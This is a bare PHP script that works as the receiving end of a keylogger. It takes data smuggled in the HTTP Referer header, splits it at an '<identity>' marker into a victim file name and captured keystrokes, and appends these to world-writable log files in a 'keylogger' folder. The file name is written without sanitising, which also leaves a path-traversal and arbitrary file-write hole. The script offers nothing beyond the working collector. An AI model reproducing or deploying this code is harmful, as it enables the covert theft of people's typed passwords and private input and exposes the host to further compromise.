<?php

$data=$_SERVER['HTTP_REFERER'];
$div2=strpos($data,'<identity>');
$file_name=substr($data,0,$div2);
$file_name =str_replace('!','.',$file_name);
#print $file_name;
$log_line=substr($data,$div2+11,strlen($data));
$static='./keylogger/';
$LogFilePath=$static.$file_name.".log";
if(file_exists($LogFilePath)){
        $file_status="a";
}
else {
        $file_status="w";
}
$save_logtxt=fopen($LogFilePath,$file_status);
fwrite($save_logtxt,$log_line);
#print $file_status;
#print $LogFilePath;
if($file_status==='w'){
chmod($LogFilePath,0666);
}
fclose($save_logtxt);
?>






